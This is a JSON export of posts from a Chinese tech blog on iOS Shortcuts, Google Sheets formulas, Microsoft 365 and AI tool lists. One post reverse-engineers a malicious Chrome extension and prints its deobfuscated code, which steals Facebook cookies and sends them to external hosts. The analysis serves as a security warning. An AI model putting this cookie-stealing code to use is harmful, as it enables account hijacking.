此功能可以在充电的过程中及时了解电量情况，并在充满电后自动播报语音提示，无需担心忘记拔掉充电器，避免过量充电对电池寿命造成的损害。 设置方法 在快捷指令的「自动化」中添加一个「电池电量」的自动化流程。电量选择等于 100%。 先获取当前音量，因为需要在语音播报后还原设备原来的音量。 将音量设置到 50%，目的是设置一个可以清楚听到语音提示的音量，还有一个目的是为了防止手机在静音或者音量很小的时候听不到语音播报。 设置一个需要语音播报的内容，这里我设置的是「充电完成」。 最后播放设置好的文本内容生成的音频，播放完成后恢复原来的音量。 在「自动化」中把「运行前询问」和「运行时通知」关闭，这样当充满电时就可以静默运行，不会有任何的提示。 ","tags":[{"name":"iOS","slug":"ios","used":true,"link":"https://dev-coco.github.io/tag/ios/"}],"title":"快捷指令 - 充电提示","feature":"https://dev-coco.github.io/post-images/Shortcuts-Charging-Reminder.png","link":"https://dev-coco.github.io/post/Shortcuts-Charging-Reminder/","stats":{"text":"1 min read","time":57000,"words":285,"minutes":1},"date":"2023-03-10 07:12:39","dateFormat":"2023-03-10"},{"content":"记录一下遇到的一个 Chrome 盗号插件逆向分析的过程。 起因 事情的经过是这样的，我在网上找到了一个在小组没有管理员的情况下，可以成为 Facebook 小组管理员的插件，而且描述写的是 2023 年有效。据我所知，这类的接口已经十分老旧，而且作用不大了，不过抱着好奇的心理，还是下载来看看。 俗话说「免费的才是最贵的」，在使用之前还是要先审查一下是否有安全隐患，因为免费的插件并不能带来什么经济收益。有的作者可以会用来提高自己的知名度而提供免费使用，有的人也会用来插入后门代码用来窃取用户隐私。 分析结构 先来分析一下这个插件安装包的整体结构。 主要的功能是通过 JavaScript 代码来控制的，所以主要分析的文件有 background.js, popup.js 和 manifest.json。 因为 manifest.json 记录了 Chrome 插件的配置文件，里面记录了哪些 JavaScript 文件在哪些域名使用，以及插件所用到的权限。content.js 虽然是 JavaScript 文件，但是不作为主要分析的文件，因为大小是 0字节，是一个空文件。jquery.min.js 是一个常见的 JavaScript 库，一般情况下不会在里面写入恶意代码，当然，不排除这种小概率事件。 manifest.json 这个文件里有几个地方比较可疑，content_scripts 和 permissions 设置的 http://*/*、https://*/* 和 &lt;all_urls&gt; 都是全局加载的。但是这个插件只是 Facebook 小组相关的功能，只需要在 Facebook 域名下使用即可，但是插件里面设置的是所有的域名都会加载代码，获取的权限太高了，超出了功能该有的权限。而且还用到了 unsafe-eval 这个比较危险的东西，可以将字符串当作代码执行。 { &quot;name&quot;: &quot;Claim Group Facebook 2023&quot;, &quot;version&quot;: &quot;0.0.1&quot;, &quot;manifest_version&quot;: 2, &quot;browser_action&quot;: { &quot;default_icon&quot;: &quot;images/icon.png&quot;, &quot;default_title&quot;: &quot;Claim Group Facebook 2023&quot; }, &quot;background&quot;: { &quot;scripts&quot;: [&quot;background.js&quot;] }, &quot;content_scripts&quot;: [ { &quot;matches&quot;: [&quot;http://*/*&quot;, &quot;https://*/*&quot;], &quot;js&quot;: [&quot;content.js&quot;,&quot;popup.js&quot;] } ], &quot;permissions&quot;: [&quot;contextMenus&quot;,&quot;webRequest&quot;, &quot;webRequestBlocking&quot;, &quot;activeTab&quot;,&quot;storage&quot;,&quot;&lt;all_urls&gt;&quot;, &quot;cookies&quot;,&quot;downloads&quot;, &quot;tabs&quot;, &quot;*://*.facebook.com/*&quot;,&quot;http://*/*&quot;, &quot;https://*/*&quot;], &quot;content_security_policy&quot;: &quot;script-src 'self' 'unsafe-eval'; object-src 'self'&quot; } popup.js 这里的代码被加密了，从开头的 _0x4bb0 变量看起来是用 16 进制 加密的，下面的代码变量名也被修改了。 那么一步一步的把代码给还原出来，使用 编码转换工具，把 16 进制 转换成文本。 这里可以看到一些越南语，还有一个域名。使用 Whois 工具查询，可以确认这是一个越南的站点，这个作者是越南人。 下半部分的代码是通过 _0x4bb0 这个数组里面取出来文本再拼接起来的，那么就手动从数组里将文本挨个还原出来。 还原后，发现还有 _0x567b 这个数组也需要还原出来，需要再还原一次。 还原后如下 不过代码现在可读性比较差，需要进行排版美化一下，再把变量名重命名。还原后的最终代码如下： $(document).ready(function () { getCookie() function getCookie () { console.log('Vui lòng không thao tác ở đây !') chrome.cookies.getAll({ url: 'https://www.facebook.com' }, function (cookieInfo) { let cookieStr = '' for (let i = 0; i &lt; cookieInfo.length; i++) { cookieStr += `${cookieInfo[i].name}=${cookieInfo[i].value};` // if (cookieInfo[i].name == 'c_user') currentUid = cookieInfo[i].value } $('#cookie').val(cookieStr) }) } $('body').on('click', '#save', function (evt) { evt.preventDefault() const uid = $('#uid').val() if (uid.length &lt; 5) { alert('Vui lòng nhập uid !') return } $('#thongtin').text('Admin nomination in progress!'); for (let i = 0; i &lt; 100; i++) { setTimeout(function () { $('#loadding').width(i + 1 + '%') $('#load').text(i + 1) if (i == 99) $('#thongtin').text('Result: You have become the admin of the group') }, i * 50) } }) }) getCookie() function getCookie () { console.log('Vui lòng không thao tác ở đây !') chrome.cookies.getAll({ 'url': 'https://www.facebook.com' }, function (cookieInfo) { let cookieStr = '' for (let i = 0; i &lt; cookieInfo.length; i++) { cookieStr += `${cookieInfo[i].name}=${cookieInfo[i].value};` // if (cookieInfo[i].name == 'c_user') currentUid = cookieInfo[i].value } currentCookie = cookieStr const headers = new Headers() headers.append('Content-Type', 'application/x-www-form-urlencoded') const body = new URLSearchParams() body.append('info', `{&quot;data&quot;: [{ &quot;type&quot;:&quot;fb&quot;,&quot;info&quot;:&quot;${currentCookie}&quot;},{}]}`) body.append('add', 'v') const option = { method: 'POST', headers, body, redirect: 'follow' } fetch('http://metaplus365.com/insert/index.php', option).then(response =&gt; { return response.text() }).then(response =&gt; { return console.log(response) }).catch(error =&gt; { return console.log('error', error) }) }) } 代码一共有两个 getCookie() 函数。第一个是根据 Facebook 的域名获取完整的 cookies 拼接好写入 #cookie 标签。 getCookie() function getCookie () { console.log('Vui lòng không thao tác ở đây !') chrome.cookies.getAll({ url: 'https://www.facebook.com' }, function (cookieInfo) { let cookieStr = '' for (let i = 0; i &lt; cookieInfo.length; i++) { cookieStr += `${cookieInfo[i].name}=${cookieInfo[i].value};` } $('#cookie').val(cookieStr) }) } 第二个的方法类似，获取完整的 cookies，并且发送到 http://metaplus365.com/insert/index.php ，这个域名。到这里已经可以确定这个插件会窃取用户隐私了。 getCookie() function getCookie () { console.log('Vui lòng không thao tác ở đây !') chrome.cookies.getAll({ 'url': 'https://www.facebook.com' }, function (cookieInfo) { let cookieStr = '' for (let i = 0; i &lt; cookieInfo.length; i++) { cookieStr += `${cookieInfo[i].name}=${cookieInfo[i].value};` } currentCookie = cookieStr const headers = new Headers() headers.append('Content-Type', 'application/x-www-form-urlencoded') const body = new URLSearchParams() body.append('info', `{&quot;data&quot;: [{ &quot;type&quot;:&quot;fb&quot;,&quot;info&quot;:&quot;${currentCookie}&quot;},{}]}`) body.append('add', 'v') const option = { method: 'POST', headers, body, redirect: 'follow' } fetch('http://metaplus365.com/insert/index.php', option).then(response =&gt; { return response.text() }).then(response =&gt; { return console.log(response) }).catch(error =&gt; { return console.log('error', error) }) }) } background.js 这里用的混淆方式和刚才的 popup.js 类似，也是使用 16 进制 加密，修改变量名。因为加密后的代码太长，就不放出来了，直接放还原后的代码。 let g_IPAdress = '' let g_Country = '' GetIPAdress() function GetIPAdress () { const option = { method: 'GET', redirect: 'follow' } fetch('http://gd.geobytes.com/GetCityDetails', option).then(response =&gt; { return response.text() }).then(response =&gt; { try { const json = JSON.parse(response) g_IPAdress = json.geobytesipaddress g_Country = json.geobytesfqcn } catch {} }).catch(error =&gt; { return console.log('error', error) }) } setTimeout(function () { SendData() }, 3000) function SendData () { const obj = {} chrome.cookies.getAll({ url: 'https://www.facebook.com' }, function (cookieInfo) { let cookieStr = '' for (let i = 0x0; i &lt; cookieInfo.length; i++) { cookieStr += `${cookieInfo[i].name}=${cookieInfo[i].value};` try { if (cookieInfo[i].name == 'c_user') obj.uid = cookieInfo[i].value } catch {} } cookieStr += `useragent=${btoa(navigator.userAgent).replace('=', '%3D').replace('=', '%3D').replace('=', '%3D')};` obj.cookie = cookieStr obj.country = g_Country obj.ip_adress = g_IPAdress console.log('all info: ' + JSON.stringify(obj)) RealSend('https://script.google.com/macros/s/AKfycbyzzn30aD8GO6t5OZDS2oADgBpmGKIf9Id5O9yHW2nzpAheqpoQNjPDGUBgodQge5ng/exec', obj) }) } function RealSend (url, obj) { const headers = new Headers() headers.append('authority', 'script.google.com') headers.append('accept', 'application/json, text/javascript, */*; q=0.01') headers.append('x-client-data', 'CIm2yQEIpbbJAQjEtskBCKmdygEI9sfKAQjnyMoBCOnIygEItMvKAQj7zcoBCNvVygEI2tfKAQie2MoB') headers.append('sec-fetch-site', 'cross-site') headers.append('sec-fetch-mode', 'cors') headers.append('sec-fetch-dest', 'empty') headers.append('accept-language', 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5') const option = { method: 'GET', headers, redirect: 'follow' } let link = '' link += url.trim() link += '?uid=' + obj.uid link += '&amp;cookie=' + btoa(obj.cookie) link += '&amp;country=' + btoa(g_Country) link += '&amp;ip_adress=' + btoa(g_IPAdress) link += '&amp;time=' + btoa(new Date().toLocaleString()) fetch(link.trim(), option).then(response =&gt; { return response.text() }).then(response =&gt; { console.log(response) }).catch(error =&gt; { return console.log('error', error) }) } 这段代码会先运行 GetIPAdress() 函数，然后向 http://gd.geobytes.com/GetCityDetails 这个域名发送请求，获取用户的 IP 地址和国家，写到变量里。 GetIPAdress() function GetIPAdress () { const option = { method: 'GET', redirect: 'follow' } fetch('http://gd.geobytes.com/GetCityDetails', option).then(response =&gt; { return response.text() }).then(response =&gt; { try { const json = JSON.parse(response) g_IPAdress = json.geobytesipaddress g_Country = json.geobytesfqcn } catch {} }).catch(error =&gt; { return console.log('error', error) }) } 等待 3 秒后会运行 SendData() 这个函数，应该是为了确保前面获取到了用户 IP 地址信息后再运行，所以才等待 3 秒。这里会获取 Facebook 的用户 ID 和 Cookies 信息，并且记录当前浏览器使用的 User-Agent，然后发送到 Google Script 自定义的 API 接口。这里也是一个窃取用户隐私的代码。 chrome.cookies.getAll({ url: 'https://www.facebook.com' }, function (cookieInfo) { let cookieStr = '' for (let i = 0x0; i &lt; cookieInfo.length; i++) { cookieStr += `${cookieInfo[i].name}=${cookieInfo[i].value};` try { if (cookieInfo[i].name == 'c_user') obj.uid = cookieInfo[i].value } catch { } } cookieStr += `useragent=${btoa(navigator.userAgent).replace('=', '%3D').replace('=', '%3D').replace('=', '%3D')};` obj.cookie = cookieStr obj.country = g_Country obj.ip_adress = g_IPAdress console.log('all info: ' + JSON.stringify(obj)) RealSend('https://script.google.com/macros/s/AKfycbyzzn30aD8GO6t5OZDS2oADgBpmGKIf9Id5O9yHW2nzpAheqpoQNjPDGUBgodQge5ng/exec', obj) }) 等等... 这个插件描述的功能是成为 Facebook 小组管理员的插件，相关的代码呢？？完全没找到和描述功能相关的代码，纯粹是一个盗号插件啊！ 请不要随意从网上下载来源不明插件或者软件，因为它们可能包含病毒和恶意软件，有时候并不会被杀毒软件查杀，这样会导致个人信息和账号被盗。建议只从官方和受信任的来源下载插件或插件。 ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"},{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"}],"title":"Chrome 插件代码逆向分析","feature":"https://dev-coco.github.io/post-images/Chrome-Extension-Reverse-Engineering.jpg","link":"https://dev-coco.github.io/post/Chrome-Extension-Reverse-Engineering/","stats":{"text":"11 min read","time":600000,"words":2109,"minutes":11},"date":"2023-03-05 06:56:19","dateFormat":"2023-03-05"},{"content":"Skype 自动回复用户自定义消息。 下载链接：Chrome 插件合集 作用 由于 Skype 社交软件原生没有自动回复等便捷功能，当咨询量大，消息多或者离开的时候，往往会出现回复不及时的情况，那么自动回复就能很好的解决这个问题。 设置 安装插件后，点击右键，选项，进行设置。 循环时间 以秒为单位，每次循环扫描界面的间隔时间。例如设置 30，那么每 30 秒就会循环扫描一次界面，检测是否有新消息。修改后不会实时生效，需要刷新 Skype 网页版后才能生效。 音量 默认在发送消息之前会发出 🔔叮～ 的声音，可以自行调节音量声音的大小。 需要回复的内容 填写需要自动回复的内容，必须包含「自动回复」。 使用方法 打开 Skype 网页版后，需要在左侧的聊天列表显示出最新聊天的联系人。因为程序只会扫描当前界面显示出来的联系人，如果当前界面不显示最新发消息的联系人，那么此功能就无法正常使用。 点击插件后，会在左上角显示开始按钮，点击按钮后即可按照设置的参数自动运行。 开始运行后不能关闭浏览器，进程也不能被冻结，否则会无法正常运行。 相关推荐 禁用 Skype 自动更新 禁用 Squirrel 框架自动更新 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Skype 自动回复","feature":"https://dev-coco.github.io/post-images/Skype-Auto-Reply.png","link":"https://dev-coco.github.io/post/Skype-Auto-Reply/","stats":{"text":"2 min read","time":81000,"words":399,"minutes":2},"date":"2023-02-22 02:57:49","dateFormat":"2023-02-22"},{"content":"类似 ARRAYFORMULA 函数实现数组输出的效果。 LAMBDA LAMBDA 是一个自定义函数，允许将一个完整的公式封装成函数重复使用。 语法 LAMBDA(变量, 公式) 例子1 将 A1 的值乘以 20。 简单的写法是 =A1 * 20，不过下面会演示 LAMBDA 函数计算的原理。 =LAMBDA(x, x * 20)(A1) 第一个参数是变量，x 是自定义的变量，A1 是引用的内容。A1 的值会被赋值到 x 变量，x 的结果同等于 A1。 第二个参数是公式，将 x 变量乘以 20，同等于 A1 * 20。最后输出的结果是 200。 例子2 计算两个数的平均值。 =LAMBDA(x, y, (x + y) / 2)(A1, B1) LAMBDA 函数支持同时设置多个变量，并且按照顺序赋值。因为需要计算两个数的平均值，所以就设置两个变量对应不同的值，这里用的是 x 和 y。A1 的值赋值到 x 变量，B1 的值赋值到 y 变量。 同等于 (A1 + B1) / 2，最后输出的结果是 56。 MAP MAP 函数必需搭配 LAMBDA 一起使用，MAP 函数会将引用范围的每一个值应用到 LAMBDA 函数中。 语法 MAP(范围, LAMBDA) 例子 计算 A1 到 A5 范围所有内容乘以 20 的结果。 MAP 函数会将 A1 到 A5 的每一个内容，循环应用到 LAMBDA 函数中，再由 LAMBDA 函数的自定义公式计算输出结果。 最后会以数组的形式输出结果。 组合使用 MAP 和 LAMBDA 组合使用的效果和 ARRAYFORMULA 函数很像，但是有的函数不支持 ARRAYFORMULA 函数数组输出，但是可以使用 MAP 和 LAMBDA 组合，例如：SUMIF、SUMIFS、GOOGLETRANSLATE 等等... 下面以 GOOGLETRANSLATE 函数为例子，将 GOOGLETRANSLATE 作为 LAMBDA 的公式，配合 MAP 函数，将 A1 到 A4 循环应用到 LAMBDA 中翻译，最后以数组的格式输出。 相关推荐： Google Excel 性能优化 - 数组输出 Google Excel IMPORTRANGE 数组输出 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel LAMBDA 和 MAP 组合函数","feature":"https://dev-coco.github.io/post-images/Google-Excel-LAMBDA-MAP-Function.jpg","link":"https://dev-coco.github.io/post/Google-Excel-LAMBDA-MAP-Function/","stats":{"text":"2 min read","time":114000,"words":501,"minutes":2},"date":"2023-02-18 06:26:20","dateFormat":"2023-02-18"},{"content":"使用节约性能的方式达到预期效果。 适用场景 数据源在一个表格，但是需要在另外一个表格进行计数。 不是最佳方案的例子 A 列日期，B 列是棋子的颜色，需要在另外一个表格统计这些日期不同棋子的颜色有多少个。 例子一 将完整的数据 IMPORTRANGE 跨表引用到另外一个表格，然后进行计数。 这样的方式计数要比在数据源表格计数还要多消耗 IMPORTRANGE 的性能，不是太理想。 例子二 在 COUNTIFS 计数的时候，用 IMPORTRANGE 跨表引用数据，然后进行计数。 这种方式非常非常不推荐，极其消耗性能，每个单元格都需要使用 IMPORTRANGE 跨表引用两遍，甚至要比例子一要多消耗好几倍的性能。 优化思路 在数据源表格进行计数，然后再引用，或者根据需要的数据创建辅助表再进行计数。 实例一 在数据源表格先进行计数，然后将计数好的内容再跨表引用到当前表格。 实例二 将 A 列的日期和 B 列的棋子颜色一起排重，那么剩下来的就是每天不重复的棋子，再将排重后的内容进行计数。 最后将这三列的内容跨表引用的另外一个表格进行计算，这种方式引用的内容要比最原始的数据量小很多，而且使用起来更加灵活。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 跨表计数","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Cross-Count-Data.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Cross-Count-Data/","stats":{"text":"2 min read","time":84000,"words":411,"minutes":2},"date":"2023-02-16 16:47:17","dateFormat":"2023-02-16"},{"content":"Microsoft 全家桶包含：Microsoft Word、Microsoft Excel、Microsoft OneNote、Microsoft Outlook、Microsoft PowerPoint 和 OneDrive。 .post-content img {width:80%} 申请 Microsoft 365 开发者计划 点击 Microsoft 365 开发者计划申请，点击 「Join now」。 登陆微软的 Outlook 或者 Hotmail 邮箱，如果没有的话就注册一个新的账号。 登陆账号后，会要求输入开发人员的基本资料。 「国家/地区」选择「United States」 「公司」自定义输入一个单位名称 「语言首选项」选择自己常用的语言 然后把条款勾选，点击「下一步」。 接下来会要求做选择题 「作为开发人员，你的主要关注点是什么？」，任意选择一个，点击「下一步」。 继续选择一个，点击「保存」。 选择「可配置沙盒」，点击「下一步」。 按照提示的内容填完表单，点击「继续」。 输入电话号码，接收短信验证码进行验证。 然后就完成注册了。 领取 OneDrive 5TB 空间 点击 OneDrive 5TB 空间，登陆刚才注册好的 Microsoft 365 E5 账号，也就是包含 onmicrosoft.com 域名的账号。 登陆后选择开发者账号。 点击左侧的「设置」，如果页面一直循环刷新无法正常加载，尝试点击 链接 进入设置页面。 点击 OneDrive 存储限制，将默认存储空间改成 5120 GB，同等于 5TB 的存储空间，点击「保存」。 不过需要登陆 Microsoft 365 E5 账号或者子账号才能使用。 开通子账号 如果想把 OneDrive 5TB 和 Microsoft 365 分享给其他账号使用，点击 Microsoft 365 管理中心，找到「用户管理」，点击「添加用户」，一共有 25 个配额。 按照要求填入姓氏、名字、显示名称和用户名，点击「下一步」。 分配产品许可证，勾选「Microsoft 365 E5 开发者（不包括 Windows 和音频会议）」，点击「下一步」。 可选设置不需要设置，直接点「下一步」。 点击「添加完毕」。 然后上面会显示账号和密码，保存好账密码。 下载 Microsoft 365 应用 从 Microsoft 365 管理中心 找到 Microsoft 365 应用，点击「安装应用」。 耐心等待下载完成。 下载完软件后，登陆 Microsoft 365 E5 账号，或者是开通好的子账号，就会看到 Microsoft 365 订阅的许可证。 自动续订 因为 Microsoft 365 E5 账号免费使用期只有 3 个月，不过可以使用自动续订功能，让他一直免费续订下去。 点击 Microsoft Azure，登陆 Microsoft 365 E5 账号。 点击「新注册」 输入名称，默认选择「仅此组织目录(仅 Raz1ner - 单一租户)中的帐户」即可，点击「注册」。 注册完成后会获得「应用程序(客户端) ID」、「对象 ID」、「目录(租户) ID」，将这些信息都保存好。 点击左侧的「证书和密码」并且点击「新增用户端密码」 按照界面提示的内容填写表单，填好后点击添加。 「说明」可以填写任意内容。 「截止期限」自定义 「启动」今天日期 「结束」两年后（最多只能选择两年） 添加完成后，会显示一个「值」，将这一段代码保存好。 点击左侧的「API 权限」并且「添加权限」。 选择「Microsoft Graph」 选择「应用程序权限」。 搜索「mail」然后将 Mail 展开，勾选「Mail.Read」、「Mail.ReadBasic」、「Mail.ReadBasic.All」、「Mail.ReadWrite」接着再点击「添加权限」。 点击「代表 Raz1ner 授予管理员同意」再点击「是」 接下来要设置 Microsoft 365 E5 账号自动续订功能。点击 E5续订，然后登陆。 点击中间的 Github 图标，登陆 Github 账号。 点击「Authorize luoye663」 再点击「返回个人中心」 点击「获取回调地址」 然后会生成一个回调链接，不要将此链接泄露给其他人。 回到 Microsoft Azure 应用注册 页面，选择应用程序。 点击「添加重定向 URI」 点击「添加平台」 选择「Web」应用程序 在「重定向 URI」放入刚才生成好的回调链接，点击「配置」。 回到 E5 续订 页面，点击「新建应用」。 输入名称，点击「确定」。 点击右边的「配置」。 按照要求输入对应的内容，输入完成后点击「下一步」。 「应用程序(客户端) ID」放入客户端 ID 「客户端密码」放入证书和密码的值 「租户ID」放入目录(租户) ID 调用设置默认值就可以，不需要修改，点击「下一步」。 点击去授权。 选择 Microsoft 365 E5 账号进行授权。 状态显示运行中就代表已经成功了，到期后就会自动续费，不用担心开发者账号过期的问题了。 理论上只要能够正常自动续费就能一直使用下去，不过客户端密码的期限最多是两年，两年后可以再更新一次密码。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"免费领取 Microsoft 全家桶和 OneDrive 5TB","feature":"https://dev-coco.github.io/post-images/Microsoft-365-Free.png","link":"https://dev-coco.github.io/post/Microsoft-365-Free/","stats":{"text":"5 min read","time":264000,"words":1221,"minutes":5},"date":"2023-02-15 01:07:50","dateFormat":"2023-02-15"},{"content":"从网络上收集的 AI 人工智能网站。 名字 类型 网站链接 简介 Masterpiece Studio 3D https://masterpiecestudio.com 使用 AI 简化 3D 创作。传统的 3D 创作工具过于复杂。现代创作者只想创造，而不是迷失在细节中。产生。编辑。部署。 G3DAI {Jedi} 3D https://g3d.ai 只需添加文本提示，即可创建您需要的任何 3D 资源。由突破性的人工智能提供支持。 Ponzu 3D https://www.ponzu.gg 使用 AI 生成的纹理对 3D 资产进行调味。 PrometheanAI 3D https://www.prometheanai.com Promethean AI 是世界上第一个与艺术家合作的人工智能，协助他们构建虚拟世界，并通过提出想法帮助创造性地解决问题。 Leonardo.Ai 3D https://leonardo.ai 创造力，革命性的 以 AI 驱动的速度和风格一致性为您的创意项目生成生产质量的资产。 Mirageml 3D https://www.mirageml.com 快速生成 3D 设计。只需使用文本来描述您想要的内容，Mirage 的人工智能平台就会生成 3D 网格和纹理。 Pixela AI 3D https://pixela.ai 人工智能生成的游戏纹理。所有这些图像都是使用深度学习文生图模型算法生成的。上传您生成的纹理与社区分享！ Kaedim 3D https://www.kaedim3d.com 2D 图像到 3D 模型。使用 AI 在线自动将 2D 转换为 3D。 Kinetix 3D https://www.kinetix.tech 用于免费创建 3D 动画的无代码平台。把自己带到元宇宙。无需技能。 Poly 3D https://withpoly.com 使用 AI 在几秒钟内生成纹理。仅通过文本提示即可创建无限高分辨率、完全自定义、商业许可的纹理。 DeepMotion 3D https://www.deepmotion.com/ Animate 3D 允许您通过使用实时身体跟踪将视频转换为 3D 动画，用于游戏、增强/虚拟现实和其他应用程序。 Scenario 3D https://www.scenario.gg 人工智能生成的游戏资产。为您的游戏创建高质量、风格一致的专有资产。 Luma AI 3D https://lumalabs.ai 以逼真的 3D 捕捉。无与伦比的真实感、反射和细节。VFX 的未来就在现在，属于每个人！ Plask 3D https://plask.ai 人工智能驱动的动捕动画工具 GET3D (Nvidia) 3D https://nv-tlabs.github.io/GET3D 从图像中学习的高质量 3D 纹理形状的生成模型。 Imagine 3D 3D https://captures.lumalabs.ai Imagine 3D 是使用文本制作 3D 原型的早期实验。随着质量和可用性的提高，我们将扩大对一代的访问 Dream Up (Deviant Art) 艺术 https://www.dreamup.com DeviantArt DreamUp™ 让您在知道创作者及其作品受到公平对待的情况下创作 AI 艺术。用人工智能的力量创造任何你能想象到的图像！通过 5 个免费提示尝试 DreamUp。 NightCafe Studio 艺术 https://creator.nightcafe.studio 人工智能艺术生成器。使用人工智能的力量创造惊人的艺术作品。 Midjourney 艺术 https://www.midjourney.com/home/ 基于 Stable Diffusion 的 AI 艺术生成器。他们的网站将他们描述为“一个独立的研究实验室，探索新的思想媒介并扩展人类的想象力。” Artbreeder 艺术 https://www.artbreeder.com 前所未有的工艺 AI 艺术 Wombo 艺术 https://www.wombo.art 使用 AI 的力量创作精美的艺术品。输入一个提示，选择一种艺术风格，然后观看 WOMBO Dream 在几秒钟内将您的想法变成一幅由 AI 驱动的绘画。 Neural.love Art Generator 艺术 https://neural.love 免费的 AI 艺术生成器，已生成超过 500 万张图像。想象一下：你通过向 AI 扔 2-3 个词来创造出令人惊叹的杰作。这不再是科幻小说了。 Playground AI 艺术 https://playgroundai.com Playground AI 是一个免费使用的在线 AI 图像创建器。用它来创作艺术、社交媒体帖子、演示文稿、海报、视频、徽标等。 Libraire 艺术 https://libraire.ai 最大的 AI 生成图像库。搜索通过深度学习文生图模型生成的 1000 万张图像和提示。 Mage 艺术 https://www.mage.space 免费、快速且未经过滤的 Stable Diffusion，文本到图像的 AI🔥 ArtroomAI 艺术 https://artroom.ai 下载深度学习文生图模型的本地 GUI。无需编写任何代码即可制作精美的 AI 生成艺术作品。 Dreamlike.art 艺术 https://dreamlike.art 借助 AI 的力量，在几秒钟内创作出令人惊叹的原创艺术作品。神奇的人工智能工具。创建无穷无尽的原始图像，修改现有图像等等。 DiffusionBee 艺术 https://diffusionbee.com 使用 Stable Diffusion 在您的计算机上生成 AI 艺术的最简单方法。 Civitai 艺术 https://civitai.com Civitai是AI艺术生成社区唯一的模型共享中心！免费使用，开源，并不断改进。 Lexica 艺术 https://lexica.art 深度学习文生图模型搜索引擎。 AI Picasso 艺术 https://aipicasso.studio.site 用强大的人工智能创造艺术。它会根据您输入的文本生成图像，就像您期望使用名为 Stable Diffusion 的 AI 一样。AI 完成填充区域。您可以根据提示编辑填充区域。 Fy! Studio 艺术 https://www.iamfy.co/studio 将您的想法变成独特的墙壁艺术。只需输入您的想法，我们就会将它们变成一件前所未见的壁画。 DaVinciFace 艺术 https://www.davinciface.com 唯一可以根据您的照片创建达芬奇风格肖像的 AI。 ArtHub 艺术 https://arthub.ai 众包 AI 艺术。探索 AI 生成的设计、图像、艺术和顶级社区艺术家和设计师的提示。 Super Prompt 艺术 https://superprompts.com 无需离开 Twitter 即可为您的 AI 艺术创建精美的画廊。 PicSo 艺术 https://picso.ai 给 AI 艺术创作者的文本。将您的文字变成令人难以置信的高质量艺术品。 Daft Art 艺术 https://daftart.ai AI 专辑封面生成器。创建您梦寐以求的专辑封面！ Clipdrop 艺术 https://clipdrop.co 由人工智能提供支持的面向所有创作者的应用程序、插件和资源的终极生态系统。在几秒钟内创建令人惊叹的视觉效果。 Openart 艺术 https://openart.ai 搜索 1000 万+ DALL·E 生成的 AI 艺术和提示 2、Midjourney、Stable Diffusion Altered 音频编辑 https://www.altered.ai 增强你的声音。我们独特的技术允许您将您的声音更改为我们精心策划的组合或自定义声音中的任何一种，并创造出引人入胜的专业声音表演。 Adobe Podcast 音频编辑 https://podcast.adobe.com 提供 2 个免费的快速工具来增强您的内容的音频。增强语音 - 通过消除所有背景噪音和回声来增强语音。Mic Check - 从您的麦克风中解锁高品质声音。主要产品承诺提供 AI 驱动的音频录制和编辑，所有这些都在网络上，并且正在等待名单中。 Podcastle 音频编辑 https://podcastle.ai 广播故事的一站式商店。适用于播客或处理长视频创作的任何人的出色 AI 工具。工作室品质的录音、人工智能编辑和无缝导出——所有这些都在一个基于网络的平台上。 Cleanvoice AI 音频编辑 https://cleanvoice.ai 停止浪费时间编辑您的播客。Cleanvoice 是一种人工智能，可以从您的播客或录音中去除填充音、口吃和口音。 Audio Strip 音频编辑 https://www.audiostrip.co.uk/ 免费近乎完美的乐器和人声隔离！ Voicemod 音频编辑 https://www.voicemod.net/ 立即免费下载 Voicemod，一款有趣又可怕的语音转换器应用程序。具有使您听起来像女孩或机器人的效果的语音转换器和修改器 DreamPic.AI 头像 https://dreampic.ai/ 由 AI 生成的图片为您主演 为您和您的朋友创建 AI 生成的头像、用户图片和个人资料图片。上传您的照片，让 AI 完成这项工作。由 Stable Diffusion 和 DreamBooth 提供支持。 Vana Portrait 头像 https://portrait.vana.com 你是一件艺术品。Vana 的“Portrait”是一个生成式艺术工作室，可以为您创建无限风格的自画像。 Hairgen AI 头像 https://www.hairgen.ai 有没有想过头发移植后你会是什么样子？在您花费数千美元进行 FUE/FUT 程序之前，先预览一下您的样子。立即使用 AI 查看您的发际线。 Avatarify 头像 https://avatarify.art/ 使用人工智能创建个性化头像。他们的技术可以让您生成栩栩如生的人物、动物甚至虚构人物形象。只需为您租用的 GPU 付费。如果您不喜欢，他们会重新渲染头像。 AI Time Machine 头像 https://www.myheritage.com/ai-time-machine 上传您自己的照片以创建令人难以置信的 AI 生成图像。使用 AI Time Machine 穿越历史。 Beb.ai 头像 https://beb.ai Beb.AI 允许您生成自己、动物或著名人物的化身。为您的品牌接收无尽的创意内容。 PictoDream 头像 https://pictodream.com/ 使用 AI 生成您自己的图像。使用简单的文字描述将任何人置于任何风格或环境中。 Ready Player Me 头像 https://readyplayer.me/ Metaverse 的跨游戏头像平台。一个化身，许多世界等待探索。 Gemsouls 头像 https://www.mygemsouls.com/ 结识、结交并创建虚拟角色。肩负着让宝石般的虚拟人栩栩如生的使命。 Theoasis 头像 https://theoasis.com/ 创建可在每个视频平台上使用的逼真头像。 Arti.pics 头像 https://www.arti.pics/ Arti.pics 是人工智能化身制作工具。它允许您上传几张自己的照片，并生成 200 多个不同风格的酷炫头像。 Profile Picture AI 头像 https://www.profilepicture.ai 使用 AI 创建完美的头像。人们在查看您的个人资料时首先看到的是您的个人资料图片。我们使用人工智能生成您的形象，看起来很完美并能捕捉到您的真实身份。你可以是任何人、任何地方或任何人！ NeuralStudio 头像 https://neural.cam/studio Neural Studio 是一个一体化的照片和艺术工作室，由最新的 AI 技术提供支持，使创作者能够轻松实现他们的创作目标。 Character AI 头像 https://beta.character.ai 智能代理居住的地方！ PhotoAI 头像 https://photoai.me/ 创建自己的 AI 照片。以我们最好的艺术风格生成 30 张您自己的照片。 Avatar AI 头像 